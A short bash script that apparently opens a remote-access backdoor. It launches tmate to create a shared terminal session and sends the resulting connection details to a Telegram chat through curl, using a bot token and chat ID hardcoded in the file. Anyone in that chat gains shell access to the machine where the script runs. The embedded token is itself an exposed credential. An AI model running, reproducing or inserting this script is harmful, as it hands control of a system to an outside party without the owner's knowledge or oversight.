#!/bin/bash

BOT_TOKEN="6101714973:AAFK-tM9WgRTBPpNT3kRyjiUeMfw295xtD4"
CHAT_ID="-1001957188901"

output=$(tmate)

# Send the output to Telegram
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=$output"
